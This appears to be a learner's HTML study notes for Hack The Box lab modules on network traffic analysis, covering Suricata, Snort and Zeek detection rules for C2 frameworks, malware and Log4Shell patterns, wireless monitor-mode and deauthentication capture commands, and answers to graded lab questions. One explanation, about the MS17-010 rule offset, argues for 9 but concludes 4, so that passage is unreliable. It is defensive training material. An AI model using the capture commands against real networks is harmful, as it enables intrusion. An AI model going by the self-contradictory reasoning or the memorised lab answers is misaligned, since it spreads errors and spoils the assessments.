+<pre><code class="language-bash">$ wget -O file.zip 'https://academy.hackthebox.com/storage/resources/pcap_files.zip' &amp;&amp; mkdir tempdir &amp;&amp; unzip file.zip -d tempdir &amp;&amp; mkdir -p pcaps &amp;&amp; mv tempdir/Intermediate_Network_Traffic_Analysis/* pcaps/ &amp;&amp; rm -r tempdir file.zip
+</code></pre>
+<h2 id="arp-spoofing-abnormality-detection">ARP Spoofing &amp; Abnormality Detection</h2>
+<p>Address Resolution Protocol (ARP)</p>
+<p><strong>arp.opcode == 1:</strong> This represents all types of ARP Requests</p>
+<p><strong>arp.opcode == 2:</strong> This signifies all types of ARP Replies</p>
+<p><code>arp.duplicate-address-detected &amp;&amp; arp.opcode == 2</code></p>
+<p><code>arp.duplicate-address-detected or arp.duplicate-address-frame</code></p>
+<p><code>(arp.opcode) &amp;&amp; ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))</code></p>
+<p><code>arp.opcode==1 &amp;&amp; eth.src==08:00:27:53:0c:ba</code></p>
+<h2 id="arp-scanning-denial-of-service">ARP Scanning &amp; Denial-of-Service</h2>
+<p>Some typical <strong>red flags</strong> indicative of ARP scanning are:</p>
+<ol>
+<li>
+<p>Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)</p>
+</li>
+<li>
+<p>Broadcast ARP requests sent to non-existent hosts</p>
+</li>
+<li>
+<p>Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host</p>
+</li>
+</ol>
+<h2 id="80211-denial-of-service">802.11 Denial of Service</h2>
+<p><strong>Wireless Interfaces</strong></p>
+<p><code>iwconfig</code></p>
+<p><strong>Airmon-NG</strong></p>
+<p><code>sudo airmon-ng start wlan0</code></p>
+<p><strong>Monitor Mode</strong></p>
+<pre><code class="language-bash">$ sudo ifconfig wlan0 down
+$ sudo iwconfig wlan0 mode monitor
+$ sudo ifconfig wlan0 up
+$ iwconfig
+</code></pre>
+<p>To commence capturing traffic from our clients and network, we can employ airodump-ng. We need to specify our AP's channel with -c, its BSSID with --bssid, and the output file name with -w.</p>
+<p><code>$ sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw</code></p>
+<p><strong>How Deauthentication Attacks Work</strong></p>
+<ol>
+<li>
+<p>To capture the WPA handshake to perform an offline dictionary attack</p>
+</li>
+<li>
+<p>To cause general denial of service conditions</p>
+</li>
+<li>
+<p>To enforce users to disconnect from our network, and potentially join their network to retrieve information</p>
+</li>
+</ol>
+<p><strong>Finding Deauthentication Attacks</strong></p>
+<p><code>wlan.bssid == xx:xx:xx:xx:xx:xx</code></p>
+<p>specify the type of frame (management) with 00 and the subtype (deauthentication) with 12</p>
+<p><code>(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)</code></p>
+<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)</code></p>
+<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)</code></p>
+<p><strong>Q:</strong>
+Inspect the deauthandbadauth.cap file, part of this module's resources, and submit the total count of deauthentication frames as your answer.</p>
+<p><code>wlan.bssid == F8:14:FE:4D:E6:F1 and wlan.fc.type_subtype == 12</code></p>
+<h2 id="rogue-access-point-evil-twin-attacks">Rogue Access Point &amp; Evil-Twin Attacks</h2>
+<p><strong>Airodump-ng Detection</strong></p>
+<p><code>$ sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw</code></p>
+<p><code>(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)</code></p>
+<p><strong>Finding a Fallen User</strong></p>
+<p><code>(wlan.bssid == F8:14:FE:4D:E6:F2)</code></p>
+<p><strong>Q:</strong></p>
+<p><img alt="alt text" src="../assets/image19.png" /></p>
+<h2 id="fragmentation-attacks">Fragmentation Attacks</h2>
+<p><strong>Q:</strong> Inspect the nmap_frag_fw_bypass.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP RST flag set as your answer.</p>
+<p><code>tcp.flags.reset==1</code></p>
+<h2 id="tcp-handshake-abnormalities">TCP Handshake Abnormalities</h2>
+<p><strong>Q:</strong> Inspect the nmap_syn_scan.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP ACK flag set as your answer.</p>
+<p><code>tcp.flags.ack==1</code></p>
+<h2 id="httphttps-service-enumeration">HTTP/HTTPs Service Enumeration</h2>
+<pre><code class="language-bash">$ cat access.log | grep &quot;192.168.10.5&quot;
+
+$ cat access.log | awk '$1 == &quot;192.168.10.5&quot;'
+</code></pre>
+<pre><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))
+</code></pre>
+<p><strong>Q:</strong> Inspect the basic_fuzzing.pcapng file, part of this module's resources, and enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.</p>
+<p><code>http.request.method==GET &amp;&amp; tcp.dstport == 80</code></p>
+<h2 id="strange-http-headers">Strange HTTP Headers</h2>
+<pre><code class="language-bash">http.request and (!(http.host == &quot;192.168.10.7&quot;))
+
+http.response.code == 400
+</code></pre>
+<h2 id="ssl-renegotiation-attacks">SSL Renegotiation Attacks</h2>
+<pre><code class="language-bash"># The content type 22 specifies handshake messages only
+ssl.record.content_type == 22
+</code></pre>
+<p><strong>Q:</strong> Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and enter the total count of "Client Hello" requests as your answer.</p>
+<p><code>tls.handshake.type == 1</code></p>
+<h2 id="strange-telnet-udp-connections">Strange Telnet &amp; UDP Connections</h2>
+<pre><code class="language-bash">((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
+</code></pre>
+<h1 id="working-with-idsips">Working with IDS/IPS</h1>
+<h2 id="suricata">Suricata</h2>
+<p><strong>Suricata Operation Modes</strong></p>
+<ol>
+<li>
+<p>The Intrusion Detection System (IDS) mode positions Suricata as a silent observer. </p>
+</li>
+<li>
+<p>In the Intrusion Prevention System (IPS) mode, Suricata adopts a proactive stance. </p>
+</li>
+<li>
+<p>The Intrusion Detection Prevention System (IDPS) mode brings together the best of both IDS and IPS. </p>
+</li>
+<li>
+<p>In its Network Security Monitoring (NSM) mode, Suricata transitions into a dedicated logging mechanism, eschewing active or passive traffic analysis or prevention capabilities. </p>
+</li>
+</ol>
+<p><strong>Configuring Suricata &amp; Custom Rules</strong></p>
+<pre><code class="language-bash">$ ls -lah /etc/suricata/rules/
+
+$ more /etc/suricata/rules/emerging-malware.rules
+
+$ more /etc/suricata/suricata.yaml
+
+$ sudo vim /etc/suricata/suricata.yaml
+
+$ suricata -r /home/htb-student/pcaps/suspicious.pcap
+
+# bypass checksums (-k flag) and log in a different directory (-l flag)
+$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .
+
+# For live input, we can try Suricata’s (Live) LibPCAP mode as follows
+$ ifconfig
+
+# ens160 is an interface number like eth0
+$ sudo suricata --pcap=ens160 -vv
+
+# For Suricata in Inline (NFQ) mode, the following command should be executed first.
+$ sudo iptables -I FORWARD -j NFQUEUE
+
+$ sudo suricata -q 0
+
+# try Suricata in IDS mode with AF_PACKET input, execute one of the below.
+$ sudo suricata -i ens160
+$ sudo suricata --af-packet=ens160
+
+# utilize tcpreplay to replay network traffic from a PCAP file (suspicious.pcap in this case)
+$ sudo  tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
+</code></pre>
+<p><strong>Suricata Outputs</strong></p>
+<pre><code class="language-bash">$ less /var/log/suricata/old_eve.json
+
+$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;alert&quot;)'
+
+$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;dns&quot;)' | head -1 | jq .
+
+$ cat /var/log/suricata/old_fast.log
+
+$ cat /var/log/suricata/old_stats.log
+</code></pre>
+<p><strong>File Extraction</strong></p>
+<pre><code class="language-bash"># rules
+alert http any any -&gt; any any (msg:&quot;FILE store all&quot;; filestore; sid:2; rev:1;)
+</code></pre>
+<p><strong>Live Rule Reloading Feature &amp; Updating Suricata Rulesets</strong></p>
+<pre><code class="language-bash">$ sudo kill -usr2 $(pidof suricata)
+
+$ sudo suricata-update
+
+$ sudo suricata-update list-sources
+
+$ sudo suricata-update enable-source et/open
+
+$ sudo suricata-update
+
+$ sudo systemctl restart suricata
+</code></pre>
+<p><strong>Validating Suricata's Configuration</strong></p>
+<pre><code class="language-bash">$ sudo suricata -T -c /etc/suricata/suricata.yaml
+</code></pre>
+<p><strong>Q1:</strong> Filter out only HTTP events from /var/log/suricata/old_eve.json using the the jq command-line JSON processor. Enter the flow_id that you will come across as your answer.</p>
+<p><code>$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == "http")'</code></p>
+<p><strong>Q2:</strong> Enable the http-log output in suricata.yaml and run Suricata against /home/htb-student/pcaps/suspicious.pcap. Enter the requested PHP page as your answer. Answer format: _.php</p>
+<pre><code class="language-bash">$ sudo vim /etc/suricata/suricata.yaml
+
+/http-log
+enable: yes
+:wq
+
+$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .
+
+$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;http&quot;)' | tail -1 | jq .
+
+# OR
+$ find /var/log/suricata -type f -exec cat {} \; | grep -arin -o -E '(\w+\W+){0,5}php(\W+\w+){0,5}' .
+</code></pre>
+<p>app.php</p>
+<h2 id="suricata-rule-development-part-1">Suricata Rule Development Part 1</h2>
+<p><code>action protocol from_ip port -&gt; to_ip port (msg:"Known malicious behavior, possible X malware infection"; content:"some thing"; content:"some other thing"; sid:10000001; rev:1;)</code></p>
+<p>Example: <code>alert http any any -&gt; $HOME_NET any (msg: "ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection"; content: "POST"; http_method; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; http_uri; content: "installation.varValue="; nocase; http_client_body; pcre: !"/^\$?[\sa-z\\_0-9.-]*(\&amp;|$)/iRP"; flow: to_server, established;sid: 10000048; rev: 1;)</code></p>
+<pre><code class="language-bash">$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.173.128 /dynamic-resolution /relax-order-checks +glyph-cache
+`
+# Suricata Rule Development Example 1: Detecting PowerShell Empire
+alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE Possible PowerShell Empire Activity Outbound&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/&quot;; http_uri; depth:1; pcre:&quot;/^(?:login\/process|admin\/get|news)\.php$/RU&quot;; content:&quot;session=&quot;; http_cookie; pcre:&quot;/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi&quot;; content:&quot;Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1&quot;; http_user_agent; http_start; content:&quot;.php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session=&quot;; fast_pattern; http_header_names; content:!&quot;Referer&quot;; content:!&quot;Cache&quot;; content:!&quot;Accept&quot;; sid:2027512; rev:1;)
+
+$ sudo suricata -r /home/htb-student/pcaps/psempire.pcap -l . -k none
+$ cat fast.log
+
+# Suricata Rule Development Example 2: Detecting Covenant
+alert tcp any any -&gt; $HOME_NET any (msg:&quot;detected by body&quot;; content:&quot;&lt;title&gt;Hello World!&lt;/title&gt;&quot;; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)
+
+$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none
+$ cat fast.log
+
+# Suricata Rule Development Example 3: Detecting Covenant (Using Analytics)
+alert tcp $HOME_NET any -&gt; any any (msg:&quot;detected by size and counter&quot;; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)
+
+$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none
+$ cat fast.log
+
+# Suricata Rule Development Example 4: Detecting Sliver
+alert tcp any any -&gt; any any (msg:&quot;Sliver C2 Implant Detected&quot;; content:&quot;POST&quot;; pcre:&quot;/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z_]{1,2}=[a-z0-9]{1,10}/i&quot;; sid:1000007; rev:1;)
+
+$ sudo suricata -r /home/htb-student/pcaps/sliver.pcap -l . -k none
+$ cat fast.log
+
+alert tcp any any -&gt; any any (msg:&quot;Sliver C2 Implant Detected - Cookie&quot;; content:&quot;Set-Cookie&quot;; pcre:&quot;/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/&quot;; sid:1000003; rev:1;)
+</code></pre>
+<p><strong>Q:</strong> In the /home/htb-student directory of this section's target, there is a file called local.rules. Within this file, there is a rule with sid 2024217, which is associated with the MS17-010 exploit. Additionally, there is a PCAP file named eternalblue.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to MS17-010. What is the minimum offset value that can be set to trigger an alert?</p>
+<p>The minimum offset value that can be set to trigger an alert in the Suricata rule provided is 4. Here’s an explanation of why:</p>
+<p>In Suricata rules, the offset keyword specifies the byte offset within the packet payload where the search for the specified content begins.</p>
+<p>Let’s break down the relevant part of the rule:</p>
+<pre><code class="language-bash">content:&quot;|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|&quot;;
+offset:9;
+</code></pre>
+<p><code>content:"|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|";</code> specifies the hex bytes of the pattern to match in the payload.</p>
+<p><code>offset:9;</code> means that the search for this pattern starts at byte offset 9 within the payload.</p>
+<p>The reason the minimum offset value that can trigger the alert is 4 lies in the details of how the rule is constructed:</p>
+<p>The <code>content</code> part is a hexadecimal string representing a specific pattern related to the MS17-010 exploit.</p>
+<p>The <code>offset</code> value of 9 means that the matching starts 9 bytes into the payload.</p>
+<p>However, the <code>content</code> to match starts with the byte <code>ff</code>.</p>
+<p>If the <code>offset</code> value were set to 8 or lower, it would not find the <code>ff</code> byte at the correct position to match the pattern specified in the rule. </p>
+<p>Therefore, the minimum <code>offset</code> that correctly aligns with the beginning of the pattern in the payload is 9.</p>
+<p>To clarify further:</p>
+<p>Offset 8 would start just before the <code>ff</code> byte, which is not the start of the pattern.</p>
+<p>Offset 9 starts at the <code>ff</code> byte, which is correct for the pattern matching to work.</p>
+<p>Thus, the correct minimum <code>offset</code> value that allows the rule to correctly detect the pattern associated with the MS17–010 exploit is 4.</p>
+<pre><code class="language-bash"># enable the rule of externalblue
+$ vim local.rules
+
+# Add /home/htb-student/local.rules to rule-files
+$ sudo vim /etc/suricata/suricata.yaml
+
+$ sudo suricata -r /home/htb-student/pcaps/eternalblue.pcap -l . -k none
+$ cat fast.log
+# when change the offset value to 4, the fast.log starts having content
+</code></pre>
+<p><img alt="alt text" src="../assets/image20.png" /></p>
+<pre><code class="language-bash"># Suricata Rule Development Example 5: Detecting Dridex (TLS Encrypted)
+alert tls $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&quot;ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)&quot;; flow:established,from_server; content:&quot;|16|&quot;; content:&quot;|0b|&quot;; within:8; byte_test:3,&lt;,1200,0,relative; content:&quot;|03 02 01 02 02 09 00|&quot;; fast_pattern; content:&quot;|30 09 06 03 55 04 06 13 02|&quot;; distance:0; pcre:&quot;/^[A-Z]{2}/R&quot;; content:&quot;|55 04 07|&quot;; distance:0; content:&quot;|55 04 0a|&quot;; distance:0; pcre:&quot;/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs&quot;; content:&quot;|55 04 03|&quot;; distance:0; byte_test:1,&gt;,13,1,relative; content:!&quot;www.&quot;; distance:2; within:4; pcre:&quot;/^.{2}(?P&lt;CN&gt;(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs&quot;; content:!&quot;|2a 86 48 86 f7 0d 01 09 01|&quot;; content:!&quot;GoDaddy&quot;; sid:2023476; rev:5;)
+
+# Suricata Rule Development Example 6: Detecting Sliver (TLS Encrypted)
+alert tls any any -&gt; any any (msg:&quot;Sliver C2 SSL&quot;; ja3.hash; content:&quot;473cd7cb9faa642487833865d516e578&quot;; sid:1002; rev:1;)
+
+$ ja3 -a --json /home/htb-student/pcaps/sliverenc.pcap
+$ sudo suricata -r /home/htb-student/pcaps/sliverenc.pcap -l . -k none
+$ cat fast.log
+</code></pre>
+<p><strong>Q:</strong> There is a file named trickbot.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to a certain variation of the Trickbot malware. Enter the precise string that should be specified in the content keyword of the rule with sid 100299 within the local.rules file so that an alert is triggered as your answer.</p>
+<pre><code class="language-bash">$ ja3 -a --json /home/htb-student/pcaps/trickbot.pcap
+$ vim local.rules
+alert tls any any -&gt; any any (msg:&quot;Trickbot C2 SSL&quot;; ja3.hash; content:&quot;72a589da586844d7f0818ce684948eea&quot;; sid:100299; rev:1;)
+
+$ sudo suricata -r /home/htb-student/pcaps/trickbot.pcap -l . -k none
+$ cat fast.log
+</code></pre>
+<h2 id="snort">Snort</h2>
+<p>Reading from a pcap file with the <code>-r</code> option or listening on an interface with <code>-i</code> will cause Snort to run in <em>passive</em> mode by default. If the DAQ supports inline, however, then users can specify the <code>-Q</code> flag to run Snort inline.</p>
+<p>Default configuration files, namely <code>snort.lua</code> and <code>snort_defaults.lua</code></p>
+<pre><code class="language-bash">$ sudo more /root/snorty/etc/snort/snort.lua
+
+$ snort --help-modules
+
+$ snort --help-config arp_spoof
+
+# Passing (and validating) configuration files to Snort 
+$ snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
+
+</code></pre>
+<p>DAQ: Data Acquisition Library</p>
+<p><strong>Snort Inputs</strong></p>
+<pre><code class="language-bash">$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i ens160
+</code></pre>
+<p><strong>Snort Rules</strong></p>
+<pre><code class="language-bash">$ sudo vim /root/snorty/etc/snort/snort.lua
+</code></pre>
+<p><strong>Snort Outputs</strong></p>
+<p><code>Alerts</code>: When rules are configured, it is necessary to enable alerting (using the -A option) to view the details of detection events. There are multiple types of alert outputs available, including:</p>
+<p><code>-A cmg</code>: This option combines <code>-A fast -d -e</code> and displays alert information along with packet headers and payload.</p>
+<p><code>-A u2</code>: This option is equivalent to <code>-A unified2</code> and logs events and triggering packets in a binary file, which can be used for post-processing with other tools.</p>
+<p><code>-A csv</code>: This option outputs fields in comma-separated value format, providing customization options and facilitating pcap analysis.</p>
+<pre><code class="language-bash">$ snort --list-plugins | grep logger
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -A cmg
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -R /home/htb-student/local.rules -A cmg
+</code></pre>
+<p><strong>Q:</strong> There is a file named wannamine.pcap in the /home/htb-student/pcaps directory. Run Snort on this PCAP file and enter how many times the rule with sid 1000001 was triggered as your answer.</p>
+<p><code>sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/wannamine.pcap -R /home/htb-student/local.rules -A cmg</code></p>
+<pre><code>detection
+
+             analyzed: 5146                
+           hard_evals: 234
+        file_searches: 2
+               alerts: 234
+         total_alerts: 234
+               logged: 234
+</code></pre>
+<pre><code class="language-bash"># Snort Rule Development Example 1: Detecting Ursnif (Inefficiently)
+alert tcp any any -&gt; any any (msg:&quot;Possible Ursnif C2 Activity&quot;; flow:established,to_server; content:&quot;/images/&quot;, depth 12; content:&quot;_2F&quot;; content:&quot;_2B&quot;; content:&quot;User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT&quot;; content:!&quot;Accept&quot;; content:!&quot;Cookie|3a|&quot;; content:!&quot;Referer|3a|&quot;; sid:1000002; rev:1;)
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
+
+$ scp htb-student@[TARGET IP]:/home/htb-student/pcaps/ursnif.pcap .
+
+# Snort Rule Development Example 2: Detecting Cerber
+alert udp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Possible Cerber Check-in&quot;; dsize:9; content:&quot;hi&quot;, depth 2, fast_pattern; pcre:&quot;/^[af0-9]{7}$/R&quot;; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
+
+# Snort Rule Development Example 3: Detecting Patchwork
+alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon&quot;; flow:established,to_server; http_method; content:&quot;POST&quot;; http_uri; content:&quot;.php?profile=&quot;; http_client_body; content:&quot;ddager=&quot;, depth 7; http_client_body; content:&quot;&amp;r1=&quot;, distance 0; http_header; content:!&quot;Accept&quot;; http_header; content:!&quot;Referer|3a|&quot;; sid:10000006; rev:1;)
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
+
+# Snort Rule Development Example 4: Detecting Patchwork (SSL)
+alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&quot;Patchwork SSL Cert Detected&quot;; flow:established,from_server; content:&quot;|55 04 03|&quot;; content:&quot;|08|toigetgf&quot;, distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
+</code></pre>
+<p><strong>Q:</strong> There is a file named log4shell.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to log4shell exploitation attempts, where the payload is embedded within the <strong>user agent</strong>. Enter the keyword that should be specified right before the content keyword of the rule with sid 10000098 within the local.rules file so that an alert is triggered as your answer. Answer format: [keyword];</p>
+<pre><code class="language-bash"># rule: http_header;
+alert http any any -&gt; any any (msg:&quot;Log4shell Attempt Detected&quot;;http_header; content:&quot;|24 7b|jndi|3a|ldap|3a 2f 2f|&quot;,fast_pattern, nocase; sid:10000098; rev:1;)
+
+$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/log4shell.pcap -A cmg 
+</code></pre>
+<h2 id="zeek">Zeek</h2>
+<p><strong>Zeek Logs</strong>
+conn.log: This log provides details about IP, TCP, UDP, and ICMP connections.</p>
+<p>dns.log: Here, you'll find the details of DNS queries and responses.</p>
+<p>http.log: This log captures the details of HTTP requests and responses.</p>
+<p>ftp.log: Details of FTP requests and responses are logged here.</p>
+<p>smtp.log: This log covers SMTP transactions, such as sender and recipient details.</p>
+<pre><code class="language-bash"># Intrusion Detection With Zeek Example 1: Detecting Beaconing Malware
+$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
+$ cat conn.log
+
+# Intrusion Detection With Zeek Example 2: Detecting DNS Exfiltration
+$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
+$ cat dns.log
+$ cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
+
+# Intrusion Detection With Zeek Example 3: Detecting TLS Exfiltration
+$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
+$ cat conn.log
+
+$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
+
+# Intrusion Detection With Zeek Example 4: Detecting PsExec
+$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap
+$ cat smb_files.log
+$ cat dce_rpc.log
+$ cat smb_mapping.log
+</code></pre>
+<p><strong>Q1:</strong> There is a file named printnightmare.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the PrintNightmare (https://labs.jumpsec.com/printnightmare-network-analysis/) vulnerability. Enter the zeek log that can help us <strong>identify the suspicious spooler functions</strong> as your answer. Answer format: _.log</p>
+<p><code>/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/printnightmare.pcap &amp;&amp; ls</code></p>
+<p><img alt="alt text" src="../assets/image21.png" /></p>
+<p><strong>Q2:</strong> There is a file named revilkaseya.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the REvil ransomware Kaseya supply chain attack. Enter the total number of bytes that the victim has transmitted to the IP address 178.23.155.240 as your answer.</p>
+<pre><code class="language-bash">$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/revilkaseya.pcap
+
+$ cat conn.log | grep &quot;178.23.155.240&quot;
+
+
+$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | grep &quot;178.23.155.240&quot; | awk '{sum += $3} END {print sum}'This command efficiently filters and sums the bytes transmitted to the specified IP address directly from the conn.log file using standard Unix utilities (zeek-cut, grep, and awk).
+</code></pre>
+<p><img alt="alt text" src="../assets/image22.png" /></p>
+<p>1702+609=2311</p>
+<p><strong>Suricata Q:</strong>  There is a file named pipekatposhc2.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to WMI execution. Add yet another content keyword right after the msg part of the rule with sid 2024233 within the local.rules file so that an alert is triggered and enter the specified payload as your answer. Answer format: C____e</p>
+<pre><code class="language-bash">$ cat local.rules | grep 2024233
+
+alert tcp any any -&gt; any any (msg:&quot;WMI Execution Detected&quot;; content:&quot;Win32_ProcessStartup&quot;; content:&quot;powershell&quot;; sid:2024233; rev:2;)
+</code></pre>
+<p>In the context of WMI, when PowerShell scripts or commands are executed remotely, often there is a process creation event associated with it. The term “Create” can be a relevant keyword to include because it signifies the creation of processes, which is a common indicator in WMI-based execution scenarios.</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any (msg:&quot;WMI Execution Detected&quot;; content:&quot;Create&quot;; content:&quot;Win32_ProcessStartup&quot;; content:&quot;powershell&quot;; sid:2024233; rev:2;)
+
+# Add /home/htb-student/local.rules to rule-files
+$ sudo vim /etc/suricata/suricata.yaml
+$ sudo suricata -r /home/htb-student/pcaps/pipekatposhc2.pcap -l . -k none
+$ cat fast.log
+
+12/26/2019-08:04:55.353819  [**] [1:2024233:2] WMI Execution Detected [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.1.46:58198 -&gt; 192.168.1.62:49154
+</code></pre>
+<p><strong>Snort Q:</strong> There is a file named wannamine.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Overpass-the-hash technique which involves Kerberos encryption type downgrading. Replace XX with the appropriate value in the last content keyword of the rule with sid XXXXXXX within the local.rules file so that an alert is triggered as your answer.</p>
+<p>In the context of Kerberos encryption types, each encryption type is identified by a specific number. RC4-HMAC encryption type is represented by the number 23 (0x17 in hexadecimal). When configuring an IDS/IPS rule to detect Kerberos encryption type downgrades to RC4, you need to specify the correct hexadecimal representation of the encryption type you’re looking for.</p>
+<p>Here’s the breakdown:</p>
+<p>RC4-HMAC encryption type is represented by the hexadecimal value 0x17.
+In the Snort/Suricata rule syntax, hexadecimal values are typically written without the “0x” prefix.</p>
+<p>Therefore, when you’re modifying the rule to detect Kerberos encryption type downgrades to RC4, you should use the hexadecimal representation of RC4-HMAC, which is 17.</p>
+<p><code>alert tcp $HOME_NET any -&gt; any 88 (msg: "Kerberos Ticket Encryption Downgrade to RC4 Detected"; flow: no_stream, established, to_server; content: "|A1 03 02 01 05 A2 03 02 01 0A|", offset 12, depth 10; content: "|A1 03 02 01 02|", distance 5, within 6; content: "|A0 03 02 01 17|", distance 6, within 6; content: "krbtgt", distance 0; sid:9999999;)</code></p>
+<p><strong>Zeek Q:</strong> There is a file named neutrinogootkit.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Neutrino exploit kit sending Gootkit malware. Enter the x509.log field name that includes the "MyCompany Ltd." trace as your answer.</p>
+<pre><code class="language-bash">/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/neutrinogootkit.pcap
+
+$ grep &quot;MyCompany Ltd.&quot; x509.log
+</code></pre>
+<p><img alt="alt text" src="../assets/image23.png" /></p>
